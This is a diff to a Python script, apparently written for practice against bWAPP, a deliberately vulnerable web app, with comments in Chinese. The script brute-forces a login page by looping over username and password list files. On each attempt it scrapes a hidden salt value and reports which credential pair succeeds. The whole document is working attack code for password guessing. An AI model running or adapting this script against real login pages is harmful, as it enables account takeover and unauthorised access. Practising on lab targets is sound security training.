@@ -4,6 +4,7 @@
 import requests
 import re
 import bs4
+import time
 import itertools as its
 from urllib import request
 from http import cookiejar
@@ -48,14 +49,17 @@ Login_Data = {
 }
 
 login_page = session.post(post_url, data=Login_Data, headers=headers1)
+
 # 保存cookies
-session.cookies.save()
+try:
+    session.cookies.save()
+    print ('cookies保存成功!')
+except Exception as e:
+    print (e)
 
 print ('登录成功，开始破解!')
 
-# print (login_page.content)
-with open('html1.html','w') as f:
-    f.write(str(login_page.content))
+
 
 
 url = 'http://101.198.180.117/bWAPP/ba_pwd_attacks_2.php'
@@ -64,10 +68,9 @@ url = 'http://101.198.180.117/bWAPP/ba_pwd_attacks_2.php'
 with open('users.txt','r') as users:
 
     for user in users.readlines():
-        # print (user)
         with open('passwords.txt','r') as passwords:
             for password in passwords.readlines():
-                # print (password)
+                # find salt
                 data = session.get(url, headers=headers2).content
                 salt_parm = r'<input type="hidden" id="salt" name="salt" value="(.*)" />'
                 salt = re.findall(salt_parm,str(data))
@@ -80,19 +83,16 @@ with open('users.txt','r') as users:
                     'salt':salt,
                     'form':'submit'
                     }
-                # print (Login_Data)
                 data = session.post(url, data=Login_Data,headers=headers2).content
-                # print (str(data))
                 result_parm = 'Successful'
                 result = re.findall(result_parm,str(data))
                 if result:
-                    print ('登陆成功！！！密码是：')
-                    print (Login_Data)
+                    print ('[+]登陆成功！！！')
+                    print ('正确用户名：{0} 密码：{1}'.format(Login_Data['login'],Login_Data['password']))
+                    break
                 else:
-                    # pass
-                    print ('登陆失败！！！')
-                # with open('html3.html','a+') as f2:
-                #     f2.write(str(data))
+                    print ('[-]登陆失败！！！')
+                    print ('[-]尝试使用用户名：{0} 密码：{1}'.format(Login_Data['login'],Login_Data['password']))
 
 
 
